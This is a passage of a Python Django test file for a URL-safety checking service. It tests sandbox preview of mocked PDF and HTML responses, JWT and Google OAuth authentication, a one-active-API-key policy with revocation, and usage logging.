        mock_resp.status_code = 200
        mock_resp.headers = {'content-type': 'application/pdf'}
        mock_resp.url = 'https://example.com/document.pdf'
        mock_resp.text = '%PDF-1.4 binary content'
        mock_resp.history = []
        mock_get.return_value = mock_resp

        findings = []
        res = analyze_sandbox_preview('https://example.com/document.pdf', findings)

        self.assertTrue(res['available'])
        self.assertFalse(res['htmlAnalyzed'])
        self.assertIn('payloadInspection', res)
        self.assertIn('linkXRay', res)

    @patch('service.url_checks.sandbox_preview.requests.get')
    def test_check_url_api_endpoint_sandbox_integration(self, mock_get):
        """Verify POST /api/check-url/ successfully finishes and returns 200 without crashing."""
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.headers = {'content-type': 'text/html'}
        mock_resp.url = 'https://portal.example.org/'
        mock_resp.text = '<html><head><title>Home</title></head><body>Welcome</body></html>'
        mock_resp.history = []
        mock_get.return_value = mock_resp

        resp = self.client.post(
            '/api/check-url/',
            {'url': 'https://portal.example.org/'},
            content_type='application/json',
        )
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertIn('structureAnalysis', data)
        self.assertIn('sandboxPreview', data['structureAnalysis'])
        self.assertIn('payloadInspection', data['structureAnalysis']['sandboxPreview'])


class DeveloperAuthAndKeyPolicyTests(TestCase):
    """
    Tests for Google OAuth, JWT authentication, and strict 1-key limit enforcement.
    """

    def setUp(self):
        from service.mongo import MongoDBClient
        db = MongoDBClient.get_db()
        db.dev_users.delete_many({})
        db.api_keys.delete_many({})
        db.usage_logs.delete_many({})

    def test_jwt_access_token_creation_and_verification(self):
        """Verify HMAC-SHA256 JWT tokens create and verify successfully."""
        from service.auth import create_access_token, verify_access_token
        token = create_access_token('user_test_1', 'dev@example.com')
        self.assertIsInstance(token, str)
        self.assertEqual(token.count('.'), 2)

        payload = verify_access_token(token)
        self.assertIsNotNone(payload)
        self.assertEqual(payload['sub'], 'user_test_1')
        self.assertEqual(payload['email'], 'dev@example.com')

        # Tampered token fails
        tampered = token[:-4] + 'xxxx'
        self.assertIsNone(verify_access_token(tampered))

        # Expired token fails
        expired_token = create_access_token('user_test_1', 'dev@example.com', expiry_days=-1)
        self.assertIsNone(verify_access_token(expired_token))

    def test_google_auth_endpoint_and_user_upsert(self):
        """POST /api/v1/auth/google/ verifies Google token and returns JWT access token."""
        resp = self.client.post(
            '/api/v1/auth/google/',
            {'idToken': 'mock_token_johndoe@test.com'},
            content_type='application/json',
        )
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertIn('accessToken', data)
        self.assertIn('user', data)
        self.assertEqual(data['user']['email'], 'johndoe@test.com')

    def test_protected_routes_require_bearer_token(self):
        """GET /api/v1/auth/me/ and /api/v1/keys/ return 401 when unauthenticated."""
        # Unauthenticated me
        resp = self.client.get('/api/v1/auth/me/')
        self.assertEqual(resp.status_code, 401)

        # Unauthenticated keys list
        resp = self.client.get('/api/v1/keys/')
        self.assertEqual(resp.status_code, 401)

        # Unauthenticated key create
        resp = self.client.post('/api/v1/keys/', {'name': 'Test'}, content_type='application/json')
        self.assertEqual(resp.status_code, 401)

    def test_single_active_key_enforcement_and_revocation(self):
        """Verify maximum 1 active key per user policy and revocation behavior."""
        from service.mongo import upsert_dev_user
        from service.auth import create_access_token

        user = upsert_dev_user(google_id='gid_101', email='tester@zeb.com', name='Tester')
        token = create_access_token(user['id'], user['email'])
        auth_header = {'HTTP_AUTHORIZATION': f'Bearer {token}'}

        # 1. Create first key -> should succeed
        resp1 = self.client.post(
            '/api/v1/keys/',
            {'name': 'Primary Key'},
            content_type='application/json',
            **auth_header,
        )
        self.assertEqual(resp1.status_code, 201)
        data1 = resp1.json()
        self.assertIn('rawSecret', data1)
        self.assertTrue(data1['rawSecret'].startswith('zeb_live_'))
        self.assertEqual(data1['key']['daily_quota'], 1000)
        self.assertEqual(data1['key']['rate_limit_per_minute'], 5)
        key_id = data1['key']['_id']

        # 2. Attempt to create second key -> must fail with 400
        resp2 = self.client.post(
            '/api/v1/keys/',
            {'name': 'Second Key Attempt'},
            content_type='application/json',
            **auth_header,
        )
        self.assertEqual(resp2.status_code, 400)
        self.assertIn('already has an active API key', resp2.json().get('error', ''))

        # 3. Check /api/v1/keys/ -> exactly 1 key returned
        list_resp = self.client.get('/api/v1/keys/', **auth_header)
        self.assertEqual(list_resp.status_code, 200)
        self.assertEqual(len(list_resp.json()['keys']), 1)

        # 4. Check /api/v1/auth/me/ -> activeKey is present
        me_resp = self.client.get('/api/v1/auth/me/', **auth_header)
        self.assertEqual(me_resp.status_code, 200)
        self.assertTrue(me_resp.json()['hasActiveKey'])
        self.assertEqual(me_resp.json()['activeKey']['_id'], key_id)

        # 5. Revoke key -> should succeed
        revoke_resp = self.client.delete(f'/api/v1/keys/{key_id}/', **auth_header)
        self.assertEqual(revoke_resp.status_code, 200)

        # 6. Check /api/v1/keys/ -> 0 active keys
        list_resp_after = self.client.get('/api/v1/keys/', **auth_header)
        self.assertEqual(len(list_resp_after.json()['keys']), 0)

        # 7. Create new key after revocation -> should succeed
        resp3 = self.client.post(
            '/api/v1/keys/',
            {'name': 'Rotated Key'},
            content_type='application/json',
            **auth_header,
        )
        self.assertEqual(resp3.status_code, 201)
        self.assertEqual(resp3.json()['key']['name'], 'Rotated Key')

    def test_user_analytics_tracking(self):
        """Verify user usage telemetry is returned by /api/v1/usage/ and /api/v1/auth/me/."""
        from service.mongo import upsert_dev_user, create_api_key_for_user, record_usage_log
        from service.auth import create_access_token

        user = upsert_dev_user(google_id='gid_202', email='analytics@zeb.com', name='Analytics Dev')
        key_doc, raw_secret = create_api_key_for_user(user['id'], 'Telemetry Key')
        token = create_access_token(user['id'], user['email'])
        auth_header = {'HTTP_AUTHORIZATION': f'Bearer {token}'}

        # Log 2 requests
        record_usage_log(key_doc, 'https://alpha.org', 200, 45)
        record_usage_log(key_doc, 'https://beta.com', 200, 32)

        # Check /api/v1/usage/
        resp = self.client.get('/api/v1/usage/', **auth_header)
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertEqual(data['todayCount'], 2)
        self.assertEqual(len(data['recentLogs']), 2)


